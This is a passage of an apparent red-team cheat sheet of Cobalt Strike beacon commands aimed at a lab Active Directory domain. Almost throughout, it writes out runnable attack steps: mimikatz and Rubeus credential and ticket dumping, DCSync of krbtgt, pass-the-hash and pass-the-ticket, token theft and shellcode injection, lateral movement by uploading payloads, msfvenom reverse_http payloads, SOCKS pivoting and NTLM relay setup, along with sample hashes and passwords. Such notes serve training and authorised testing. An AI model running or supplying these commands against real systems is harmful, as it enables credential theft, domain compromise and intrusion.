</code></pre></div><h3 id=credential-theft>Credential Theft</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># &#34;!&#34; symbol is used to run command in elevated context of System User</span>
<span style=color:#75715e># &#34;@&#34; symbol is used to impersonate beacon thread token</span>

<span style=color:#75715e># Dump TGT/TGS Tickets</span>
beacon&gt; mimikatz !sekurlsa::tickets
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x14794e /nowrap
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval<span style=color:#960050;background-color:#1e0010>:</span>10 /nowrap

<span style=color:#75715e># Dump the local SAM database </span>
beacon&gt; mimikatz !lsadump::sam

<span style=color:#75715e># Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users</span>
beacon&gt; mimikatz !sekurlsa::logonpasswords

<span style=color:#75715e># Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)</span>
beacon&gt; mimikatz !sekurlsa::ekeys

<span style=color:#75715e># Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked as the hash format is not NTLM so it can&#39;t be used with pass the hash)</span>
<span style=color:#75715e># https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials#cracking-mscash-mscache-with-hashcat</span>
beacon&gt; mimikatz !lsadump::cache

<span style=color:#75715e># List the kerberos tickets cached in current logon session or all logon session (privileged session)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

<span style=color:#75715e># Dump the TGT Ticket from given Logon Session (LUID)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid<span style=color:#960050;background-color:#1e0010>:</span>0x7049f /service<span style=color:#960050;background-color:#1e0010>:</span>krbtgt

<span style=color:#75715e># DC Sync</span>
beacon&gt; make_token DEV\nlamb F3rrari
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt
beacon&gt; mimikatz !lsadump::dcsync /all /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
<span style=color:#75715e># Dump krbtgt hash from DC (locally)</span>
beacon&gt; mimikatz !lsadump::lsa /inject /name<span style=color:#960050;background-color:#1e0010>:</span>krbtgt
</code></pre></div><h3 id=domain-recon>Domain Recon</h3><ul><li>Domain Recon using Power View</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Load Powerview powershell script in Beacon Session (Cobalt Strike)</span>
beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

<span style=color:#75715e># Get Domain Information</span>
beacon&gt; powerpick Get-Domain -Domain &lt;&gt;

<span style=color:#75715e># Get Domain SID</span>
beacon&gt; powerpick Get-DomainSID

<span style=color:#75715e># Get Domain Controller</span>
beacon&gt; powerpick Get-DomainController | select Forest, Name, OSVersion | fl

<span style=color:#75715e># Get Forest Information</span>
beacon&gt; powerpick Get-ForestDomain -Forest &lt;&gt;

<span style=color:#75715e># Get Domain Policy </span>
beacon&gt; powerpick Get-DomainPolicyData | select -expand SystemAccess

<span style=color:#75715e># Get Domain users</span>
beacon&gt; powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

<span style=color:#75715e># Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation</span>
beacon&gt; powerpick Get-DomainUser | select cn,serviceprincipalname
beacon&gt; powerpick Get-DomainUser -PreauthNotRequired
beacon&gt; powerpick Get-DomainUser -TrustedToAuth

<span style=color:#75715e># Get Domain Computer</span>
beacon&gt; powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

<span style=color:#75715e># Idenitify Computer Accounts where unconstrained and constrained delegation is enabled</span>
beacon&gt; powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon&gt; powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

<span style=color:#75715e># Get Domain OU</span>
beacon&gt; powerpick Get-DomainOU -Properties Name | sort -Property Name

<span style=color:#75715e># Identify computers in given OU</span>
beacon&gt; powerpick Get-DomainComputer -SearchBase <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>OU=Workstations,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> | select dnsHostName

<span style=color:#75715e># Get Domain group (Use -Recurse Flag)</span>
beacon&gt; powerpick Get-DomainGroup | where Name <span style=color:#f92672>-like</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>*Admins*</span><span style=color:#e6db74>&#34;</span> | select SamAccountName

<span style=color:#75715e># Get Domain Group Member</span>
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Admins</span><span style=color:#e6db74>&#34;</span> | select MemberDistinguishedName
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Admins</span><span style=color:#e6db74>&#34;</span> -Recurse | select MemberDistinguishedName

<span style=color:#75715e># Get Domain GPO</span>
beacon&gt; powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

<span style=color:#75715e># Find the System where given GPO are applicable</span>
beacon&gt; powerpick Get-DomainOU -GPLink <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}</span><span style=color:#e6db74>&#34;</span> | select distinguishedName

<span style=color:#75715e># Idenitfy domain users/group who have local admin via Restricted group or GPO </span>
beacon&gt; powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

<span style=color:#75715e># Enumerates the machines where a specific domain user/group has local admin rights</span>
beacon&gt; powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

<span style=color:#75715e># Get Domain Trusts</span>
beacon&gt; powerpick Get-DomainTrust

<span style=color:#75715e># Find interesting ACLs</span>
beacon&gt; powerpick Find-InterestingDomainAcl -ResolveGUIDs

<span style=color:#75715e># ----------------------------------------------------------------------------</span>

<span style=color:#75715e># Find Local Admin Access on other domain computers based on context of current user</span>
beacon&gt; powerpick Find-LocalAdminAccess -Verbose
beacon&gt; powerpick Invoke-CheckLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
<span style=color:#75715e># Not available in Powerview , need scripts Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1</span>
beacon&gt; powerpick Find-PSRemotingLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
beacon&gt; powerpick Find-WMILocalAdminAccess -ComputerName &lt;server_fqdn&gt;

<span style=color:#75715e># Check for computers where users or domain admin may have logged in sessions</span>
<span style=color:#75715e># Find computers where a domain admin (or specified user/group) has sessions</span>
beacon&gt; powerpick Find-DomainUserLocation -Verbose
beacon&gt; powerpick Find-DomainUserLocation -UserGroupIdentity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Users</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Find computers where a domain admin session is available and current user has admin access (uses `Test-AdminAccess`). -CheckAccess Flag Sometimes not gives accurate results with Find-DomainUserLocation , So use Invoke-UserHunter.</span>
beacon&gt; powerpick Invoke-UserHunter -CheckAccess
beacon&gt; powerpick Find-DomainUserLocation -CheckAccess
<span style=color:#75715e># Find computers (File Servers and Distributed File servers) where a domain admin session is available.</span>
beacon&gt; powerpick Find-DomainUserLocation <span style=color:#960050;background-color:#1e0010>–</span>Stealth
beacon&gt; powerpick Invoke-StealthUserHunter

<span style=color:#75715e># Finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines</span>
beacon&gt; powerpick Invoke-UserHunter -CheckAccess
<span style=color:#75715e># Finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users    </span>
beacon&gt; powerpick Invoke-StealthUserHunter
<span style=color:#75715e># Hunts for processes with a specific name or owned by specific user on domain machines</span>
beacon&gt; powerpick Invoke-ProcessHunter
<span style=color:#75715e># Hunts for user logon events in domain controller event logs</span>
beacon&gt; powerpick Invoke-UserEventHunter

<span style=color:#75715e># Find shares on hosts in current domain.</span>
beacon&gt; powerpick Invoke-ShareFinder <span style=color:#960050;background-color:#1e0010>–</span>Verbose
<span style=color:#75715e># Find sensitive files on computers in the domain</span>
beacon&gt; powerpick Invoke-FileFinder -Verbose
<span style=color:#75715e># Get all fileservers of the domain</span>
beacon&gt; powerpick Get-NetFileServer
</code></pre></div><ul><li>Domain recon using SharpView binary</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>beacon&gt; execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
</code></pre></div><ul><li>Domain recon using ADSearch</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>objectCategory=user</span><span style=color:#e6db74>&#34;</span>

beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=group)(cn=*Admins*))</span><span style=color:#e6db74>&#34;</span>

beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=group)(cn=MS SQL Admins))</span><span style=color:#e6db74>&#34;</span> --attributes cn,member

<span style=color:#75715e># Kerberostable Users</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(servicePrincipalName=*))</span><span style=color:#e6db74>&#34;</span> --attributes cn,servicePrincipalName,samAccountName

<span style=color:#75715e># ASEPROAST</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</span><span style=color:#e6db74>&#34;</span> --attributes cn,distinguishedname,samaccountname

<span style=color:#75715e># Unconstrained Delegation</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><span style=color:#e6db74>&#34;</span> --attributes samaccountname,dnshostname

<span style=color:#75715e># Constrained Delegation</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))</span><span style=color:#e6db74>&#34;</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

<span style=color:#75715e># Additionally, the `--json` parameter can be used to format the output in JSON</span>
</code></pre></div><h3 id=user-impersonation>User Impersonation</h3><ul><li>Pass The Hash Attack (PTH)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>beacon&gt; getuid
beacon&gt; ls \\web.dev.cyberbotic.io\c$

<span style=color:#75715e># PTH using inbuild method in CS (internally uses Mimikatz)</span>
beacon&gt; pth DEV\jking 59fc0f884922b4ce376051134c71e22c

<span style=color:#75715e># Find Local Admin Access</span>
beacon&gt; powerpick Find-LocalAdminAccess

beacon&gt; rev2self
</code></pre></div><ul><li>Pass The Ticket Attack (PTT)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Create a sacrificial token with dummy credentials</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /username<span style=color:#960050;background-color:#1e0010>:</span>bfarmer /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass123

<span style=color:#75715e># Inject the TGT ticket into logon session returned as output of previous command</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid<span style=color:#960050;background-color:#1e0010>:</span>0x798c2c /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...snip...]lDLklP

<span style=color:#75715e># OR Combine above 2 steps in one</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /username<span style=color:#960050;background-color:#1e0010>:</span>bfarmer /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass123 /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...snip...]lDLklP 

beacon&gt; steal_token 4748
beacon&gt; token-store steal 4748

<span style=color:#75715e># Now check access by trying to list the c: drive</span>
beacon&gt; ls \\web.dev.cyberbotic.io\c$
</code></pre></div><ul><li>OverPassTheHash (OPTH)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Using rc4 NTLM Hash</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>jking /ntlm<span style=color:#960050;background-color:#1e0010>:</span>59fc0f884922b4ce376051134c71e22c /nowrap

<span style=color:#75715e># Using aes256 hash for better opsec, along with /domain (Use NetBios name &#34;DEV&#34; not FQDN &#34;dev.cyberbotic.io&#34;) and /opsec flags (better opsec)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>jking /aes256<span style=color:#960050;background-color:#1e0010>:</span>4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /opsec /nowrap

<span style=color:#75715e># Using username and password to obtain TGT</span>
<span style=color:#75715e># We can use Rubeus Hash Functionality to calculate hash from the credentials</span>
<span style=color:#75715e># Calculate Hash of the random password, So we can use it to get TGT.</span>
cmd&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password<span style=color:#960050;background-color:#1e0010>:</span>oIrpupAtF1YCXaw /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
<span style=color:#75715e># Alternatively we can use make_token in Cobalt Strike</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>jking /password<span style=color:#960050;background-color:#1e0010>:</span>&lt;password&gt; /enctype<span style=color:#960050;background-color:#1e0010>:</span>&lt;des|aes128|aes256|rc4(<span style=color:#66d9ef>default</span>)&gt; /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /opsec /nowrap
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>mssql_svc /password<span style=color:#960050;background-color:#1e0010>:</span>Cyberb0tic /enctype<span style=color:#960050;background-color:#1e0010>:</span>rc4 /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /nowrap
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>EvilComputer$ /aes256<span style=color:#960050;background-color:#1e0010>:</span>7A79D...44 /nowrap

<span style=color:#75715e># Now using this TGT perform PTT attack</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /username<span style=color:#960050;background-color:#1e0010>:</span>bfarmer /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass123 /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...snip...]lDLklP

beacon&gt; steal_token 4748
beacon&gt; token-store steal 4748

<span style=color:#75715e># Now we can check for LocalAdminAccess and then Move Laterally.</span>
beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Find-LocalAdminAccess -Verbose
</code></pre></div><ul><li>Token Impersonation , Token Store, Make Token & Process Injection</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># steal access token from another process using steal_token</span>
beacon&gt; steal_token &lt;PID&gt;

<span style=color:#75715e># Drop the impersonation (Revert to ourself)</span>
beacon&gt; rev2self

<span style=color:#75715e># Storing and managing stolen access tokens using token-store</span>
<span style=color:#75715e># Steal a token from a Process and add it to token store</span>
beacon&gt; token-store steal 5536
<span style=color:#75715e># List all stored tokens</span>
beacon&gt; token-store show
<span style=color:#75715e># Impersonating a Stored Token</span>
beacon&gt; token-store use &lt;id&gt;
<span style=color:#75715e># Drop the impersonation</span>
beacon&gt; rev2self
<span style=color:#75715e># Removing a Single Token or Flushing all tokens</span>
beacon&gt; token-store remove &lt;id&gt;
beacon&gt; token-store remove-all

<span style=color:#75715e># Impersonating Domain User with Credentials using make_token (make_token = runas /netonly)</span>
<span style=color:#75715e># The logon session created with LogonUserA API (make_token) has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.</span>
beacon&gt; make_token DEV\jking &lt;Password&gt;

<span style=color:#75715e># Process Injection</span>
<span style=color:#75715e># `shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine</span>
beacon&gt; shinject &lt;PID&gt; &lt;x86|x64&gt; /path/to/binary.bin
<span style=color:#75715e># `inject` will inject a full Beacon payload for the specified listener.</span>
beacon&gt; inject 4464 x64 tcp-local
</code></pre></div><h3 id=lateral-movement>Lateral Movement</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># using Jump</span>
<span style=color:#75715e>## This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.</span>
<span style=color:#75715e># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command, So some methods in jump command which uses Powershell like psexec_psh , winrm and winrm64 will not work if payload is detected, So we musty have to use Custom AMSI Bypass script to avoif that and get a shell.</span>
<span style=color:#75715e># To make the jump command work and include amsi bypass into it, We need to modify the Resource kit&#39;s template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).</span>
<span style=color:#75715e># To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span>
beacon&gt; jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

<span style=color:#75715e># Using remote exec</span>
<span style=color:#75715e>## You also need to connect to P2P Beacons manually using connect or link.</span>
beacon&gt; remote-exec psexec/winrm/wmi ComputerName &lt;uploaded binary on remote system&gt;
<span style=color:#75715e># To execute commands</span>
beacon&gt; remote-exec winrm ComputerName &lt;execute commands&gt;
<span style=color:#75715e>#--------------------------------------------------------------</span>
<span style=color:#75715e># Using PSExec (Requires TGS for CIFS)</span>
<span style=color:#75715e>## Make sure to change the Post-Ex process for Psexec which is Rundll32.exe by default and even Malleable c2&#39;s Post-Ex don&#39;t help here , So we have to do it manually using spawnto.</span>
beacon&gt; ak-settings
beacon&gt; spawnto x64 <span style=color:#66d9ef>%</span>windir%\sysnative\dllhost.exe
beacon&gt; spawnto x86 <span style=color:#66d9ef>%</span>windir%\syswrun klist ow64\dllhost.exe

beacon&gt; jump psexec64 web.dev.cyberbotic.io smb
beacon&gt; jump psexec_psh web.dev.cyberbotic.io smb

beacon&gt; cd \\web.dev.cyberbotic.io\ADMIN$
beacon&gt; upload C:\Payloads\smb_x64.exe
beacon&gt; remote-exec psexec web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon&gt; remote-exec psexec sql-2 powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#39;C:\Windows\smb_x64.exe&#39;</span>
beacon&gt; link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
<span style=color:#75715e>## Then use powerpick to get its own process name, it will return dllhost.</span>
beacon&gt; powerpick Get-Process -Id $pid | select ProcessName

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>
<span style=color:#75715e># Example Windows Remote Management (WinRM) - (Requires TGS for HOST &amp; HTTP)</span>
beacon&gt; ls \\web.dev.cyberbotic.io\c$
beacon&gt; jump winrm64 web.dev.cyberbotic.io smb
beacon&gt; jump winrm web.dev.cyberbotic.io smb

beacon&gt; cd \\web.dev.cyberbotic.io\c$\ProgramData
beacon&gt; upload C:\Payloads\smb_x64.exe
beacon&gt; remote-exec winrm web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon&gt; remote-exec winrm sql-2 powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#39;C:\Windows\smb_x64.exe&#39;</span>
beacon&gt; link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff1
<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>
<span style=color:#75715e># Example Windows Management Instrumentation (WMI) - (Requires TGS for HOST &amp; RPCSS)</span>
<span style=color:#75715e># If gets COM Error try to upload the binary to directory where user may have access</span>
beacon&gt; cd \\web.dev.cyberbotic.io\c$\ProgramData
beacon&gt; upload C:\Payloads\smb_x64.exe
beacon&gt; remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon&gt; remote-exec wmi sql-2 powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#39;C:\Windows\smb_x64.exe&#39;</span>
beacon&gt; link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

<span style=color:#75715e># Using SharpWMI</span>
beacon&gt; execute-assembly c:\Tools\Ghostpack-CompiledBinaries\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command=<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\smb_beacon2.exe</span><span style=color:#e6db74>&#34;</span>
beacon&gt; link WINTERFELL msagent_eb

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>
<span style=color:#75715e># Executing .Net binary remotely</span>
<span style=color:#75715e>## Some of Seatbelt&#39;s commands can also be run remotely, which can be useful enumerating its configurations and defences before jumping to it.</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

<span style=color:#75715e>#--------------------------------------------------------------------------------------</span>
<span style=color:#75715e># Invoke DCOM (better opsec) (Requires TGS for RPCSS)</span>
beacon&gt; powershell-import C:\Tools\Invoke-DCOM.ps1
beacon&gt; cd \\web.dev.cyberbotic.io\ADMIN$
beacon&gt; upload c:\Payloads\smb_x64.exe
beacon&gt; powerpick Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
beacon&gt; link web.dev.cyberbotic.io agent_vinod

<span style=color:#75715e>#--------------------------------------------------------------------------------------</span>
<span style=color:#75715e>## NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution</span>
</code></pre></div><h3 id=session-passing>Session Passing</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)</span>
beacon&gt; spawn x64 http

<span style=color:#75715e># CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)</span>
<span style=color:#75715e># Setup Metasploit listener</span>
attacker@ubuntu ~&gt; sudo msfconsole -q
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) &gt; set LHOST ens5
msf6 exploit(multi/handler) &gt; set LPORT 8080
msf6 exploit(multi/handler) &gt; run
<span style=color:#75715e># Setup a Foreign Listener in cobalt strike with above IP &amp; port details</span>
<span style=color:#75715e># Use Jump psexec to execute the beacon payload and pass the session</span>
beacon&gt; jump psexec Foreign_listener
beacon&gt; spawn x86 Foreign_listener

<span style=color:#75715e># CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)</span>
<span style=color:#75715e># Setup up metasploit</span>
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) &gt; exploit
<span style=color:#75715e># Generate binary</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 <span style=color:#f92672>-f</span> raw -o /mnt/c/Payloads/msf_http_x64.bin
<span style=color:#75715e># Inject msf shellcode into process memory</span>
beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin
</code></pre></div><h3 id=pivoting>Pivoting</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)</span>
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
beacon&gt; socks 1080 socks4
beacon&gt; socks stop
<span style=color:#75715e># Verify the SOCKS proxy on team server</span>
attacker@ubuntu ~&gt; sudo ss -lpnt

<span style=color:#75715e># Configure Proxychains in Linux</span>
$ sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password
$attacker@ubuntu ~&gt; proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
$attacker@ubuntu ~ &gt; proxychains wmiexec.py DEV/jking@10.10.122.30

<span style=color:#75715e># Tunnel Metasploit Framework exploits and modules through Beacon.</span>
beacon&gt; socks 6666 socks4
msf&gt; setg Proxies socks4<span style=color:#960050;background-color:#1e0010>:</span>TeamServerIP<span style=color:#960050;background-color:#1e0010>:</span>Port
msf&gt; setg ReverseAllowProxy true
msf&gt; unsetg Proxies

<span style=color:#75715e># Use Proxifier for Windows environment </span>
ps&gt; runas /netonly /user<span style=color:#960050;background-color:#1e0010>:</span>dev/bfarmer mmc.exe
ps&gt; mimikatz &gt; privilege::debug
ps&gt; mimikatz &gt; sekurlsa::pth /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /user<span style=color:#960050;background-color:#1e0010>:</span>bfarmer /ntlm<span style=color:#960050;background-color:#1e0010>:</span>4ea24377a53e67e78b2bd853974420fc /run<span style=color:#960050;background-color:#1e0010>:</span>mmc.exe
PS C:\Users\Attacker&gt; $cred = Get-Credential
PS C:\Users\Attacker&gt; Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

<span style=color:#75715e># Use FoxyProxy plugin to access Webportal via SOCKS Proxy</span>

<span style=color:#75715e># Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)</span>
beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; rportfwd stop 8080

beacon&gt; run netstat -anp tcp
beacon&gt; powershell New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Test Rule</span><span style=color:#e6db74>&#34;</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
ps&gt; iwr -Uri http<span style=color:#960050;background-color:#1e0010>:</span>//wkstn-2<span style=color:#960050;background-color:#1e0010>:</span>8080/a
beacon&gt; powershell Remove-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Test Rule</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># -------------------------------------------------------------------------------</span>
<span style=color:#75715e># NTLM Relay</span>

<span style=color:#75715e># 1. Allow ports inbound on the Windows firewall (One for SMB and one for Powershell cradle).</span>
beacon&gt; powershell New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>8445-In</span><span style=color:#e6db74>&#34;</span> -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon&gt; powershell New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>8080-In</span><span style=color:#e6db74>&#34;</span> -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

<span style=color:#75715e># 2. Setup reverse port forwarding - one for the SMB capture, the other for a PowerShell download cradle.</span>
